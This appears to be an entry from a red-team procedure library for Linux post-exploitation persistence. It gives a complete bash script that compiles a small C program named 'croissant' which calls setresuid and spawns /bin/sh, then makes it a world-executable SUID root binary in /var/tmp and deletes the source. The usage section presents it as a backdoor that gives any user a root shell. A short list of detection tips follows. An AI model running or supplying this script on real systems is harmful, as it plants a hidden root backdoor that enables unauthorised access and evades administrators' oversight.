---
id: 66734d7e-e570-405d-8c26-97be3a5c12b8
name: Create-SUID-Root-Shell-Binary
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:17.932562+00:00'
updated_at: '2023-04-10T20:34:16.558746+00:00'
platforms:
  - Linux
tags:
  - persistence
  - suid
  - backdoor
validated: true
---

# Create-SUID-Root-Shell-Binary

## Code

```bash
TMPDIR2="/var/tmp"
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
rm $TMPDIR2/croissant.c
chown root:root $TMPDIR2/croissant
chmod 4777 $TMPDIR2/croissant
```

## Description

This bash script automates the creation of a SUID binary named 'croissant' that spawns a root shell when executed by any user. It writes C source code to elevate privileges via setresuid and system calls, compiles it with gcc, cleans up the source, and sets root ownership with SUID permissions. Used for establishing persistence on compromised Linux systems.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $TMPDIR2 | Path to the directory for the binary (persistent location) | /var/tmp |

## Usage

Execute the entire script as root on a target Linux system during post-exploitation. After running, any user can execute /var/tmp/croissant to get a root shell. Ideal for maintaining access in red team operations or after initial privilege escalation.

## Detection

- Monitor for new SUID binaries in /var/tmp or /tmp using auditd or file integrity tools.
- Log gcc compilations and chmod/chown operations on executables.
- Check process trees for unexpected root shells spawned from custom binaries.
- Strings analysis on suspicious binaries revealing setresuid or system calls.

## Related

- [[procedures/Linux-SUID-Binary-Persistence]]
- [[gcc-compile-binary]]
